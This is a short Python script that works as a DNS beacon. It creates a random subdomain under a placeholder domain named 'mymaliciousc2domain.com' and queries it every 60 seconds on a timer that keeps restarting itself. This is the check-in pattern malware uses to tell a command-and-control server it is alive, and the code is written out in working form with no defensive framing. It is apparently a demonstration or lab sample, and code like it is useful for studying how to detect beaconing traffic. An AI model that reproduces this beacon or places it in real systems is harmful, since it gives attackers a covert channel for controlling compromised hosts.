import dns.resolver
import string
from random import *
import threading

min_char = 8
max_char = 16
allchar = string.ascii_letters + string.digits
subdomain = "".join(choice(allchar) for x in range(randint(min_char, max_char)))

url = subdomain + ".mymaliciousc2domain.com"

def dns_beacon():
    threading.Timer(60.0, dns_beacon).start()
    myResolver = dns.resolver.Resolver()
    myResponse = myResolver.query(url)
dns_beacon()



 
